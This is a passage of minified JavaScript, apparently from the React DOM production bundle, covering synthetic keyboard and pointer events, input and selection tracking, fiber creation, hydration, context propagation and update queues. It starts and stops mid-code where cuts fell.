			119: "F8",
			120: "F9",
			121: "F10",
			122: "F11",
			123: "F12",
			144: "NumLock",
			145: "ScrollLock",
			224: "Meta",
		},
		Xd = {
			Alt: "altKey",
			Control: "ctrlKey",
			Meta: "metaKey",
			Shift: "shiftKey",
		};
	function Qd(l) {
		var t = this.nativeEvent;
		return t.getModifierState
			? t.getModifierState(l)
			: (l = Xd[l])
			? !!t[l]
			: !1;
	}
	function nc() {
		return Qd;
	}
	var Ld = D({}, za, {
			key: function (l) {
				if (l.key) {
					var t = Yd[l.key] || l.key;
					if (t !== "Unidentified") return t;
				}
				return l.type === "keypress"
					? ((l = _u(l)), l === 13 ? "Enter" : String.fromCharCode(l))
					: l.type === "keydown" || l.type === "keyup"
					? Gd[l.keyCode] || "Unidentified"
					: "";
			},
			code: 0,
			location: 0,
			ctrlKey: 0,
			shiftKey: 0,
			altKey: 0,
			metaKey: 0,
			repeat: 0,
			locale: 0,
			getModifierState: nc,
			charCode: function (l) {
				return l.type === "keypress" ? _u(l) : 0;
			},
			keyCode: function (l) {
				return l.type === "keydown" || l.type === "keyup"
					? l.keyCode
					: 0;
			},
			which: function (l) {
				return l.type === "keypress"
					? _u(l)
					: l.type === "keydown" || l.type === "keyup"
					? l.keyCode
					: 0;
			},
		}),
		Zd = Xl(Ld),
		Vd = D({}, Uu, {
			pointerId: 0,
			width: 0,
			height: 0,
			pressure: 0,
			tangentialPressure: 0,
			tiltX: 0,
			tiltY: 0,
			twist: 0,
			pointerType: 0,
			isPrimary: 0,
		}),
		Uf = Xl(Vd),
		Kd = D({}, za, {
			touches: 0,
			targetTouches: 0,
			changedTouches: 0,
			altKey: 0,
			metaKey: 0,
			ctrlKey: 0,
			shiftKey: 0,
			getModifierState: nc,
		}),
		Jd = Xl(Kd),
		kd = D({}, ge, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
		Wd = Xl(kd),
		$d = D({}, Uu, {
			deltaX: function (l) {
				return "deltaX" in l
					? l.deltaX
					: "wheelDeltaX" in l
					? -l.wheelDeltaX
					: 0;
			},
			deltaY: function (l) {
				return "deltaY" in l
					? l.deltaY
					: "wheelDeltaY" in l
					? -l.wheelDeltaY
					: "wheelDelta" in l
					? -l.wheelDelta
					: 0;
			},
			deltaZ: 0,
			deltaMode: 0,
		}),
		Fd = Xl($d),
		Id = D({}, ge, { newState: 0, oldState: 0 }),
		Pd = Xl(Id),
		l0 = [9, 13, 27, 32],
		cc = Mt && "CompositionEvent" in window,
		Ma = null;
	Mt && "documentMode" in document && (Ma = document.documentMode);
	var t0 = Mt && "TextEvent" in window && !Ma,
		Hf = Mt && (!cc || (Ma && 8 < Ma && 11 >= Ma)),
		Cf = " ",
		Bf = !1;
	function qf(l, t) {
		switch (l) {
			case "keyup":
				return l0.indexOf(t.keyCode) !== -1;
			case "keydown":
				return t.keyCode !== 229;
			case "keypress":
			case "mousedown":
			case "focusout":
				return !0;
			default:
				return !1;
		}
	}
	function wf(l) {
		return (
			(l = l.detail), typeof l == "object" && "data" in l ? l.data : null
		);
	}
	var Ze = !1;
	function e0(l, t) {
		switch (l) {
			case "compositionend":
				return wf(t);
			case "keypress":
				return t.which !== 32 ? null : ((Bf = !0), Cf);
			case "textInput":
				return (l = t.data), l === Cf && Bf ? null : l;
			default:
				return null;
		}
	}
	function a0(l, t) {
		if (Ze)
			return l === "compositionend" || (!cc && qf(l, t))
				? ((l = Of()), (Ou = tc = Vt = null), (Ze = !1), l)
				: null;
		switch (l) {
			case "paste":
				return null;
			case "keypress":
				if (
					!(t.ctrlKey || t.altKey || t.metaKey) ||
					(t.ctrlKey && t.altKey)
				) {
					if (t.char && 1 < t.char.length) return t.char;
					if (t.which) return String.fromCharCode(t.which);
				}
				return null;
			case "compositionend":
				return Hf && t.locale !== "ko" ? null : t.data;
			default:
				return null;
		}
	}
	var u0 = {
		color: !0,
		date: !0,
		datetime: !0,
		"datetime-local": !0,
		email: !0,
		month: !0,
		number: !0,
		password: !0,
		range: !0,
		search: !0,
		tel: !0,
		text: !0,
		time: !0,
		url: !0,
		week: !0,
	};
	function Yf(l) {
		var t = l && l.nodeName && l.nodeName.toLowerCase();
		return t === "input" ? !!u0[l.type] : t === "textarea";
	}
	function Gf(l, t, e, a) {
		Qe ? (Le ? Le.push(a) : (Le = [a])) : (Qe = a),
			(t = pn(t, "onChange")),
			0 < t.length &&
				((e = new Ru("onChange", "change", null, e, a)),
				l.push({ event: e, listeners: t }));
	}
	var Oa = null,
		_a = null;
	function n0(l) {
		So(l, 0);
	}
	function Hu(l) {
		var t = Ea(l);
		if (Sf(t)) return l;
	}
	function Xf(l, t) {
		if (l === "change") return t;
	}
	var Qf = !1;
	if (Mt) {
		var ic;
		if (Mt) {
			var fc = "oninput" in document;
			if (!fc) {
				var Lf = document.createElement("div");
				Lf.setAttribute("oninput", "return;"),
					(fc = typeof Lf.oninput == "function");
			}
			ic = fc;
		} else ic = !1;
		Qf = ic && (!document.documentMode || 9 < document.documentMode);
	}
	function Zf() {
		Oa && (Oa.detachEvent("onpropertychange", Vf), (_a = Oa = null));
	}
	function Vf(l) {
		if (l.propertyName === "value" && Hu(_a)) {
			var t = [];
			Gf(t, _a, l, In(l)), Mf(n0, t);
		}
	}
	function c0(l, t, e) {
		l === "focusin"
			? (Zf(), (Oa = t), (_a = e), Oa.attachEvent("onpropertychange", Vf))
			: l === "focusout" && Zf();
	}
	function i0(l) {
		if (l === "selectionchange" || l === "keyup" || l === "keydown")
			return Hu(_a);
	}
	function f0(l, t) {
		if (l === "click") return Hu(t);
	}
	function s0(l, t) {
		if (l === "input" || l === "change") return Hu(t);
	}
	function r0(l, t) {
		return (
			(l === t && (l !== 0 || 1 / l === 1 / t)) || (l !== l && t !== t)
		);
	}
	var Il = typeof Object.is == "function" ? Object.is : r0;
	function Da(l, t) {
		if (Il(l, t)) return !0;
		if (
			typeof l != "object" ||
			l === null ||
			typeof t != "object" ||
			t === null
		)
			return !1;
		var e = Object.keys(l),
			a = Object.keys(t);
		if (e.length !== a.length) return !1;
		for (a = 0; a < e.length; a++) {
			var u = e[a];
			if (!qn.call(t, u) || !Il(l[u], t[u])) return !1;
		}
		return !0;
	}
	function Kf(l) {
		for (; l && l.firstChild; ) l = l.firstChild;
		return l;
	}
	function Jf(l, t) {
		var e = Kf(l);
		l = 0;
		for (var a; e; ) {
			if (e.nodeType === 3) {
				if (((a = l + e.textContent.length), l <= t && a >= t))
					return { node: e, offset: t - l };
				l = a;
			}
			l: {
				for (; e; ) {
					if (e.nextSibling) {
						e = e.nextSibling;
						break l;
					}
					e = e.parentNode;
				}
				e = void 0;
			}
			e = Kf(e);
		}
	}
	function kf(l, t) {
		return l && t
			? l === t
				? !0
				: l && l.nodeType === 3
				? !1
				: t && t.nodeType === 3
				? kf(l, t.parentNode)
				: "contains" in l
				? l.contains(t)
				: l.compareDocumentPosition
				? !!(l.compareDocumentPosition(t) & 16)
				: !1
			: !1;
	}
	function Wf(l) {
		l =
			l != null &&
			l.ownerDocument != null &&
			l.ownerDocument.defaultView != null
				? l.ownerDocument.defaultView
				: window;
		for (var t = Au(l.document); t instanceof l.HTMLIFrameElement; ) {
			try {
				var e = typeof t.contentWindow.location.href == "string";
			} catch {
				e = !1;
			}
			if (e) l = t.contentWindow;
			else break;
			t = Au(l.document);
		}
		return t;
	}
	function sc(l) {
		var t = l && l.nodeName && l.nodeName.toLowerCase();
		return (
			t &&
			((t === "input" &&
				(l.type === "text" ||
					l.type === "search" ||
					l.type === "tel" ||
					l.type === "url" ||
					l.type === "password")) ||
				t === "textarea" ||
				l.contentEditable === "true")
		);
	}
	var o0 = Mt && "documentMode" in document && 11 >= document.documentMode,
		Ve = null,
		rc = null,
		Ra = null,
		oc = !1;
	function $f(l, t, e) {
		var a =
			e.window === e
				? e.document
				: e.nodeType === 9
				? e
				: e.ownerDocument;
		oc ||
			Ve == null ||
			Ve !== Au(a) ||
			((a = Ve),
			"selectionStart" in a && sc(a)
				? (a = { start: a.selectionStart, end: a.selectionEnd })
				: ((a = (
						(a.ownerDocument && a.ownerDocument.defaultView) ||
						window
				  ).getSelection()),
				  (a = {
						anchorNode: a.anchorNode,
						anchorOffset: a.anchorOffset,
						focusNode: a.focusNode,
						focusOffset: a.focusOffset,
				  })),
			(Ra && Da(Ra, a)) ||
				((Ra = a),
				(a = pn(rc, "onSelect")),
				0 < a.length &&
					((t = new Ru("onSelect", "select", null, t, e)),
					l.push({ event: t, listeners: a }),
					(t.target = Ve))));
	}
	function xe(l, t) {
		var e = {};
		return (
			(e[l.toLowerCase()] = t.toLowerCase()),
			(e["Webkit" + l] = "webkit" + t),
			(e["Moz" + l] = "moz" + t),
			e
		);
	}
	var Ke = {
			animationend: xe("Animation", "AnimationEnd"),
			animationiteration: xe("Animation", "AnimationIteration"),
			animationstart: xe("Animation", "AnimationStart"),
			transitionrun: xe("Transition", "TransitionRun"),
			transitionstart: xe("Transition", "TransitionStart"),
			transitioncancel: xe("Transition", "TransitionCancel"),
			transitionend: xe("Transition", "TransitionEnd"),
		},
		dc = {},
		Ff = {};
	Mt &&
		((Ff = document.createElement("div").style),
		"AnimationEvent" in window ||
			(delete Ke.animationend.animation,
			delete Ke.animationiteration.animation,
			delete Ke.animationstart.animation),
		"TransitionEvent" in window || delete Ke.transitionend.transition);
	function be(l) {
		if (dc[l]) return dc[l];
		if (!Ke[l]) return l;
		var t = Ke[l],
			e;
		for (e in t) if (t.hasOwnProperty(e) && e in Ff) return (dc[l] = t[e]);
		return l;
	}
	var If = be("animationend"),
		Pf = be("animationiteration"),
		ls = be("animationstart"),
		d0 = be("transitionrun"),
		h0 = be("transitionstart"),
		m0 = be("transitioncancel"),
		ts = be("transitionend"),
		es = new Map(),
		hc =
			"abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
				" "
			);
	hc.push("scrollEnd");
	function vt(l, t) {
		es.set(l, t), ye(t, [l]);
	}
	var as = new WeakMap();
	function it(l, t) {
		if (typeof l == "object" && l !== null) {
			var e = as.get(l);
			return e !== void 0
				? e
				: ((t = { value: l, source: t, stack: bf(t) }),
				  as.set(l, t),
				  t);
		}
		return { value: l, source: t, stack: bf(t) };
	}
	var ft = [],
		Je = 0,
		mc = 0;
	function Cu() {
		for (var l = Je, t = (mc = Je = 0); t < l; ) {
			var e = ft[t];
			ft[t++] = null;
			var a = ft[t];
			ft[t++] = null;
			var u = ft[t];
			ft[t++] = null;
			var n = ft[t];
			if (((ft[t++] = null), a !== null && u !== null)) {
				var c = a.pending;
				c === null ? (u.next = u) : ((u.next = c.next), (c.next = u)),
					(a.pending = u);
			}
			n !== 0 && us(e, u, n);
		}
	}
	function Bu(l, t, e, a) {
		(ft[Je++] = l),
			(ft[Je++] = t),
			(ft[Je++] = e),
			(ft[Je++] = a),
			(mc |= a),
			(l.lanes |= a),
			(l = l.alternate),
			l !== null && (l.lanes |= a);
	}
	function vc(l, t, e, a) {
		return Bu(l, t, e, a), qu(l);
	}
	function ke(l, t) {
		return Bu(l, null, null, t), qu(l);
	}
	function us(l, t, e) {
		l.lanes |= e;
		var a = l.alternate;
		a !== null && (a.lanes |= e);
		for (var u = !1, n = l.return; n !== null; )
			(n.childLanes |= e),
				(a = n.alternate),
				a !== null && (a.childLanes |= e),
				n.tag === 22 &&
					((l = n.stateNode),
					l === null || l._visibility & 1 || (u = !0)),
				(l = n),
				(n = n.return);
		return l.tag === 3
			? ((n = l.stateNode),
			  u &&
					t !== null &&
					((u = 31 - Fl(e)),
					(l = n.hiddenUpdates),
					(a = l[u]),
					a === null ? (l[u] = [t]) : a.push(t),
					(t.lane = e | 536870912)),
			  n)
			: null;
	}
	function qu(l) {
		if (50 < au) throw ((au = 0), (Si = null), Error(h(185)));
		for (var t = l.return; t !== null; ) (l = t), (t = l.return);
		return l.tag === 3 ? l.stateNode : null;
	}
	var We = {};
	function v0(l, t, e, a) {
		(this.tag = l),
			(this.key = e),
			(this.sibling =
				this.child =
				this.return =
				this.stateNode =
				this.type =
				this.elementType =
					null),
			(this.index = 0),
			(this.refCleanup = this.ref = null),
			(this.pendingProps = t),
			(this.dependencies =
				this.memoizedState =
				this.updateQueue =
				this.memoizedProps =
					null),
			(this.mode = a),
			(this.subtreeFlags = this.flags = 0),
			(this.deletions = null),
			(this.childLanes = this.lanes = 0),
			(this.alternate = null);
	}
	function Pl(l, t, e, a) {
		return new v0(l, t, e, a);
	}
	function yc(l) {
		return (l = l.prototype), !(!l || !l.isReactComponent);
	}
	function Ot(l, t) {
		var e = l.alternate;
		return (
			e === null
				? ((e = Pl(l.tag, t, l.key, l.mode)),
				  (e.elementType = l.elementType),
				  (e.type = l.type),
				  (e.stateNode = l.stateNode),
				  (e.alternate = l),
				  (l.alternate = e))
				: ((e.pendingProps = t),
				  (e.type = l.type),
				  (e.flags = 0),
				  (e.subtreeFlags = 0),
				  (e.deletions = null)),
			(e.flags = l.flags & 65011712),
			(e.childLanes = l.childLanes),
			(e.lanes = l.lanes),
			(e.child = l.child),
			(e.memoizedProps = l.memoizedProps),
			(e.memoizedState = l.memoizedState),
			(e.updateQueue = l.updateQueue),
			(t = l.dependencies),
			(e.dependencies =
				t === null
					? null
					: { lanes: t.lanes, firstContext: t.firstContext }),
			(e.sibling = l.sibling),
			(e.index = l.index),
			(e.ref = l.ref),
			(e.refCleanup = l.refCleanup),
			e
		);
	}
	function ns(l, t) {
		l.flags &= 65011714;
		var e = l.alternate;
		return (
			e === null
				? ((l.childLanes = 0),
				  (l.lanes = t),
				  (l.child = null),
				  (l.subtreeFlags = 0),
				  (l.memoizedProps = null),
				  (l.memoizedState = null),
				  (l.updateQueue = null),
				  (l.dependencies = null),
				  (l.stateNode = null))
				: ((l.childLanes = e.childLanes),
				  (l.lanes = e.lanes),
				  (l.child = e.child),
				  (l.subtreeFlags = 0),
				  (l.deletions = null),
				  (l.memoizedProps = e.memoizedProps),
				  (l.memoizedState = e.memoizedState),
				  (l.updateQueue = e.updateQueue),
				  (l.type = e.type),
				  (t = e.dependencies),
				  (l.dependencies =
						t === null
							? null
							: {
									lanes: t.lanes,
									firstContext: t.firstContext,
							  })),
			l
		);
	}
	function wu(l, t, e, a, u, n) {
		var c = 0;
		if (((a = l), typeof l == "function")) yc(l) && (c = 1);
		else if (typeof l == "string")
			c = gh(l, e, U.current)
				? 26
				: l === "html" || l === "head" || l === "body"
				? 27
				: 5;
		else
			l: switch (l) {
				case bt:
					return (
						(l = Pl(31, e, t, u)),
						(l.elementType = bt),
						(l.lanes = n),
						l
					);
				case J:
					return pe(e.children, u, n, t);
				case rl:
					(c = 8), (u |= 24);
					break;
				case dl:
					return (
						(l = Pl(12, e, t, u | 2)),
						(l.elementType = dl),
						(l.lanes = n),
						l
					);
				case F:
					return (
						(l = Pl(13, e, t, u)),
						(l.elementType = F),
						(l.lanes = n),
						l
					);
				case Kl:
					return (
						(l = Pl(19, e, t, u)),
						(l.elementType = Kl),
						(l.lanes = n),
						l
					);
				default:
					if (typeof l == "object" && l !== null)
						switch (l.$$typeof) {
							case xt:
							case vl:
								c = 10;
								break l;
							case Yl:
								c = 9;
								break l;
							case mt:
								c = 11;
								break l;
							case Jl:
								c = 14;
								break l;
							case kl:
								(c = 16), (a = null);
								break l;
						}
					(c = 29),
						(e = Error(h(130, l === null ? "null" : typeof l, ""))),
						(a = null);
			}
		return (
			(t = Pl(c, e, t, u)),
			(t.elementType = l),
			(t.type = a),
			(t.lanes = n),
			t
		);
	}
	function pe(l, t, e, a) {
		return (l = Pl(7, l, a, t)), (l.lanes = e), l;
	}
	function gc(l, t, e) {
		return (l = Pl(6, l, null, t)), (l.lanes = e), l;
	}
	function xc(l, t, e) {
		return (
			(t = Pl(4, l.children !== null ? l.children : [], l.key, t)),
			(t.lanes = e),
			(t.stateNode = {
				containerInfo: l.containerInfo,
				pendingChildren: null,
				implementation: l.implementation,
			}),
			t
		);
	}
	var $e = [],
		Fe = 0,
		Yu = null,
		Gu = 0,
		st = [],
		rt = 0,
		Se = null,
		_t = 1,
		Dt = "";
	function Te(l, t) {
		($e[Fe++] = Gu), ($e[Fe++] = Yu), (Yu = l), (Gu = t);
	}
	function cs(l, t, e) {
		(st[rt++] = _t), (st[rt++] = Dt), (st[rt++] = Se), (Se = l);
		var a = _t;
		l = Dt;
		var u = 32 - Fl(a) - 1;
		(a &= ~(1 << u)), (e += 1);
		var n = 32 - Fl(t) + u;
		if (30 < n) {
			var c = u - (u % 5);
			(n = (a & ((1 << c) - 1)).toString(32)),
				(a >>= c),
				(u -= c),
				(_t = (1 << (32 - Fl(t) + u)) | (e << u) | a),
				(Dt = n + l);
		} else (_t = (1 << n) | (e << u) | a), (Dt = l);
	}
	function bc(l) {
		l.return !== null && (Te(l, 1), cs(l, 1, 0));
	}
	function pc(l) {
		for (; l === Yu; )
			(Yu = $e[--Fe]), ($e[Fe] = null), (Gu = $e[--Fe]), ($e[Fe] = null);
		for (; l === Se; )
			(Se = st[--rt]),
				(st[rt] = null),
				(Dt = st[--rt]),
				(st[rt] = null),
				(_t = st[--rt]),
				(st[rt] = null);
	}
	var wl = null,
		gl = null,
		tl = !1,
		Ee = null,
		St = !1,
		Sc = Error(h(519));
	function Ne(l) {
		var t = Error(h(418, ""));
		throw (Ca(it(t, l)), Sc);
	}
	function is(l) {
		var t = l.stateNode,
			e = l.type,
			a = l.memoizedProps;
		switch (((t[Cl] = l), (t[Gl] = a), e)) {
			case "dialog":
				K("cancel", t), K("close", t);
				break;
			case "iframe":
			case "object":
			case "embed":
				K("load", t);
				break;
			case "video":
			case "audio":
				for (e = 0; e < nu.length; e++) K(nu[e], t);
				break;
			case "source":
				K("error", t);
				break;
			case "img":
			case "image":
			case "link":
				K("error", t), K("load", t);
				break;
			case "details":
				K("toggle", t);
				break;
			case "input":
				K("invalid", t),
					Tf(
						t,
						a.value,
						a.defaultValue,
						a.checked,
						a.defaultChecked,
						a.type,
						a.name,
						!0
					),
					zu(t);
				break;
			case "select":
				K("invalid", t);
				break;
			case "textarea":
				K("invalid", t),
					Nf(t, a.value, a.defaultValue, a.children),
					zu(t);
		}
		(e = a.children),
			(typeof e != "string" &&
				typeof e != "number" &&
				typeof e != "bigint") ||
			t.textContent === "" + e ||
			a.suppressHydrationWarning === !0 ||
			jo(t.textContent, e)
				? (a.popover != null && (K("beforetoggle", t), K("toggle", t)),
				  a.onScroll != null && K("scroll", t),
				  a.onScrollEnd != null && K("scrollend", t),
				  a.onClick != null && (t.onclick = Sn),
				  (t = !0))
				: (t = !1),
			t || Ne(l);
	}
	function fs(l) {
		for (wl = l.return; wl; )
			switch (wl.tag) {
				case 5:
				case 13:
					St = !1;
					return;
				case 27:
				case 3:
					St = !0;
					return;
				default:
					wl = wl.return;
			}
	}
	function Ua(l) {
		if (l !== wl) return !1;
		if (!tl) return fs(l), (tl = !0), !1;
		var t = l.tag,
			e;
		if (
			((e = t !== 3 && t !== 27) &&
				((e = t === 5) &&
					((e = l.type),
					(e =
						!(e !== "form" && e !== "button") ||
						qi(l.type, l.memoizedProps))),
				(e = !e)),
			e && gl && Ne(l),
			fs(l),
			t === 13)
		) {
			if (
				((l = l.memoizedState),
				(l = l !== null ? l.dehydrated : null),
				!l)
			)
				throw Error(h(317));
			l: {
				for (l = l.nextSibling, t = 0; l; ) {
					if (l.nodeType === 8)
						if (((e = l.data), e === "/$")) {
							if (t === 0) {
								gl = gt(l.nextSibling);
								break l;
							}
							t--;
						} else (e !== "$" && e !== "$!" && e !== "$?") || t++;
					l = l.nextSibling;
				}
				gl = null;
			}
		} else
			t === 27
				? ((t = gl),
				  ie(l.type) ? ((l = Xi), (Xi = null), (gl = l)) : (gl = t))
				: (gl = wl ? gt(l.stateNode.nextSibling) : null);
		return !0;
	}
	function Ha() {
		(gl = wl = null), (tl = !1);
	}
	function ss() {
		var l = Ee;
		return (
			l !== null &&
				(Zl === null ? (Zl = l) : Zl.push.apply(Zl, l), (Ee = null)),
			l
		);
	}
	function Ca(l) {
		Ee === null ? (Ee = [l]) : Ee.push(l);
	}
	var Tc = E(null),
		je = null,
		Rt = null;
	function Kt(l, t, e) {
		z(Tc, t._currentValue), (t._currentValue = e);
	}
	function Ut(l) {
		(l._currentValue = Tc.current), M(Tc);
	}
	function Ec(l, t, e) {
		for (; l !== null; ) {
			var a = l.alternate;
			if (
				((l.childLanes & t) !== t
					? ((l.childLanes |= t), a !== null && (a.childLanes |= t))
					: a !== null &&
					  (a.childLanes & t) !== t &&
					  (a.childLanes |= t),
				l === e)
			)
				break;
			l = l.return;
		}
	}
	function Nc(l, t, e, a) {
		var u = l.child;
		for (u !== null && (u.return = l); u !== null; ) {
			var n = u.dependencies;
			if (n !== null) {
				var c = u.child;
				n = n.firstContext;
				l: for (; n !== null; ) {
					var i = n;
					n = u;
					for (var s = 0; s < t.length; s++)
						if (i.context === t[s]) {
							(n.lanes |= e),
								(i = n.alternate),
								i !== null && (i.lanes |= e),
								Ec(n.return, e, l),
								a || (c = null);
							break l;
						}
					n = i.next;
				}
			} else if (u.tag === 18) {
				if (((c = u.return), c === null)) throw Error(h(341));
				(c.lanes |= e),
					(n = c.alternate),
					n !== null && (n.lanes |= e),
					Ec(c, e, l),
					(c = null);
			} else c = u.child;
			if (c !== null) c.return = u;
			else
				for (c = u; c !== null; ) {
					if (c === l) {
						c = null;
						break;
					}
					if (((u = c.sibling), u !== null)) {
						(u.return = c.return), (c = u);
						break;
					}
					c = c.return;
				}
			u = c;
		}
	}
	function Ba(l, t, e, a) {
		l = null;
		for (var u = t, n = !1; u !== null; ) {
			if (!n) {
				if ((u.flags & 524288) !== 0) n = !0;
				else if ((u.flags & 262144) !== 0) break;
			}
			if (u.tag === 10) {
				var c = u.alternate;
				if (c === null) throw Error(h(387));
				if (((c = c.memoizedProps), c !== null)) {
					var i = u.type;
					Il(u.pendingProps.value, c.value) ||
						(l !== null ? l.push(i) : (l = [i]));
				}
			} else if (u === Wl.current) {
				if (((c = u.alternate), c === null)) throw Error(h(387));
				c.memoizedState.memoizedState !==
					u.memoizedState.memoizedState &&
					(l !== null ? l.push(ou) : (l = [ou]));
			}
			u = u.return;
		}
		l !== null && Nc(t, l, e, a), (t.flags |= 262144);
	}
	function Xu(l) {
		for (l = l.firstContext; l !== null; ) {
			if (!Il(l.context._currentValue, l.memoizedValue)) return !0;
			l = l.next;
		}
		return !1;
	}
	function ze(l) {
		(je = l),
			(Rt = null),
			(l = l.dependencies),
			l !== null && (l.firstContext = null);
	}
	function Bl(l) {
		return rs(je, l);
	}
	function Qu(l, t) {
		return je === null && ze(l), rs(l, t);
	}
	function rs(l, t) {
		var e = t._currentValue;
		if (((t = { context: t, memoizedValue: e, next: null }), Rt === null)) {
			if (l === null) throw Error(h(308));
			(Rt = t),
				(l.dependencies = { lanes: 0, firstContext: t }),
				(l.flags |= 524288);
		} else Rt = Rt.next = t;
		return e;
	}
	var y0 =
			typeof AbortController < "u"
				? AbortController
				: function () {
						var l = [],
							t = (this.signal = {
								aborted: !1,
								addEventListener: function (e, a) {
									l.push(a);
								},
							});
						this.abort = function () {
							(t.aborted = !0),
								l.forEach(function (e) {
									return e();
								});
						};
				  },
		g0 = N.unstable_scheduleCallback,
		x0 = N.unstable_NormalPriority,
		Nl = {
			$$typeof: vl,
			Consumer: null,
			Provider: null,
			_currentValue: null,
			_currentValue2: null,
			_threadCount: 0,
		};
	function jc() {
		return { controller: new y0(), data: new Map(), refCount: 0 };
	}
	function qa(l) {
		l.refCount--,
			l.refCount === 0 &&
				g0(x0, function () {
					l.controller.abort();
				});
	}
	var wa = null,
		zc = 0,
		Ie = 0,
		Pe = null;
	function b0(l, t) {
		if (wa === null) {
			var e = (wa = []);
			(zc = 0),
				(Ie = Mi()),
				(Pe = {
					status: "pending",
					value: void 0,
					then: function (a) {
						e.push(a);
					},
				});
		}
		return zc++, t.then(os, os), t;
	}
	function os() {
		if (--zc === 0 && wa !== null) {
			Pe !== null && (Pe.status = "fulfilled");
			var l = wa;
			(wa = null), (Ie = 0), (Pe = null);
			for (var t = 0; t < l.length; t++) (0, l[t])();
		}
	}
	function p0(l, t) {
		var e = [],
			a = {
				status: "pending",
				value: null,
				reason: null,
				then: function (u) {
					e.push(u);
				},
			};
		return (
			l.then(
				function () {
					(a.status = "fulfilled"), (a.value = t);
					for (var u = 0; u < e.length; u++) (0, e[u])(t);
				},
				function (u) {
					for (
						a.status = "rejected", a.reason = u, u = 0;
						u < e.length;
						u++
					)
						(0, e[u])(void 0);
				}
			),
			a
		);
	}
	var ds = b.S;
	b.S = function (l, t) {
		typeof t == "object" &&
			t !== null &&
			typeof t.then == "function" &&
			b0(l, t),
			ds !== null && ds(l, t);
	};
	var Ae = E(null);
	function Ac() {
		var l = Ae.current;
		return l !== null ? l : ol.pooledCache;
	}
	function Lu(l, t) {
		t === null ? z(Ae, Ae.current) : z(Ae, t.pool);
	}
	function hs() {
		var l = Ac();
		return l === null ? null : { parent: Nl._currentValue, pool: l };
	}
	var Ya = Error(h(460)),
		ms = Error(h(474)),
		Zu = Error(h(542)),
		Mc = { then: function () {} };
	function vs(l) {
		return (l = l.status), l === "fulfilled" || l === "rejected";
	}
	function Vu() {}
	function ys(l, t, e) {
		switch (
			((e = l[e]),
			e === void 0 ? l.push(t) : e !== t && (t.then(Vu, Vu), (t = e)),
			t.status)
		) {
			case "fulfilled":
				return t.value;
			case "rejected":
				throw ((l = t.reason), xs(l), l);
			default:
				if (typeof t.status == "string") t.then(Vu, Vu);
				else {
					if (((l = ol), l !== null && 100 < l.shellSuspendCounter))
						throw Error(h(482));
					(l = t),
						(l.status = "pending"),
						l.then(
							function (a) {
								if (t.status === "pending") {
									var u = t;
									(u.status = "fulfilled"), (u.value = a);
								}
							},
							function (a) {
								if (t.status === "pending") {
									var u = t;
									(u.status = "rejected"), (u.reason = a);
								}
							}
						);
				}
				switch (t.status) {
					case "fulfilled":
						return t.value;
					case "rejected":
						throw ((l = t.reason), xs(l), l);
				}
				throw ((Ga = t), Ya);
		}
	}
	var Ga = null;
	function gs() {
		if (Ga === null) throw Error(h(459));
		var l = Ga;
		return (Ga = null), l;
	}
	function xs(l) {
		if (l === Ya || l === Zu) throw Error(h(483));
	}
	var Jt = !1;
	function Oc(l) {
		l.updateQueue = {
			baseState: l.memoizedState,
			firstBaseUpdate: null,
			lastBaseUpdate: null,
			shared: { pending: null, lanes: 0, hiddenCallbacks: null },
			callbacks: null,
		};
	}
	function _c(l, t) {
		(l = l.updateQueue),
			t.updateQueue === l &&
				(t.updateQueue = {
					baseState: l.baseState,
					firstBaseUpdate: l.firstBaseUpdate,
					lastBaseUpdate: l.lastBaseUpdate,
					shared: l.shared,
					callbacks: null,
				});
	}
	function kt(l) {
		return { lane: l, tag: 0, payload: null, callback: null, next: null };
	}
	function Wt(l, t, e) {
		var a = l.updateQueue;
		if (a === null) return null;
		if (((a = a.shared), (al & 2) !== 0)) {
			var u = a.pending;
			return (
				u === null ? (t.next = t) : ((t.next = u.next), (u.next = t)),
				(a.pending = t),
				(t = qu(l)),
				us(l, null, e),
				t
			);
		}
		return Bu(l, a, t, e), qu(l);
	}
	function Xa(l, t, e) {
		if (
			((t = t.updateQueue),
			t !== null && ((t = t.shared), (e & 4194048) !== 0))
		) {
			var a = t.lanes;
			(a &= l.pendingLanes), (e |= a), (t.lanes = e), of(l, e);
		}
	}
	function Dc(l, t) {
		var e = l.updateQueue,
			a = l.alternate;
		if (a !== null && ((a = a.updateQueue), e === a)) {
			var u = null,
				n = null;
			if (((e = e.firstBaseUpdate), e !== null)) {
				do {
					var c = {
						lane: e.lane,
						tag: e.tag,
						payload: e.payload,
						callback: null,
						next: null,
					};
					n === null ? (u = n = c) : (n = n.next = c), (e = e.next);
				} while (e !== null);
				n === null ? (u = n = t) : (n = n.next = t);
			} else u = n = t;
			(e = {
				baseState: a.baseState,
				firstBaseUpdate: u,
				lastBaseUpdate: n,
				shared: a.shared,
				callbacks: a.callbacks,
			}),
				(l.updateQueue = e);
			return;
		}
		(l = e.lastBaseUpdate),
			l === null ? (e.firstBaseUpdate = t) : (l.next = t),
			(e.lastBaseUpdate = t);
	}
	var Rc = !1;
	function Qa() {
		if (Rc) {
			var l = Pe;
			if (l !== null) throw l;
		}
	}
	function La(l, t, e, a) {
		Rc = !1;
		var u = l.updateQueue;
		Jt = !1;
		var n = u.firstBaseUpdate,
			c = u.lastBaseUpdate,
			i = u.shared.pending;
		if (i !== null) {
			u.shared.pending = null;
			var s = i,
				v = s.next;
			(s.next = null), c === null ? (n = v) : (c.next = v), (c = s);
			var x = l.alternate;
			x !== null &&
				((x = x.updateQueue),
				(i = x.lastBaseUpdate),
				i !== c &&
					(i === null ? (x.firstBaseUpdate = v) : (i.next = v),
					(x.lastBaseUpdate = s)));
		}
		if (n !== null) {
			var S = u.baseState;
			(c = 0), (x = v = s = null), (i = n);
			do {
				var y = i.lane & -536870913,
					g = y !== i.lane;
				if (g ? (k & y) === y : (a & y) === y) {
					y !== 0 && y === Ie && (Rc = !0),
						x !== null &&
							(x = x.next =
								{
									lane: 0,
									tag: i.tag,
									payload: i.payload,
									callback: null,
									next: null,
								});
					l: {
						var Y = l,
							H = i;
						y = t;
						var il = e;
						switch (H.tag) {
							case 1:
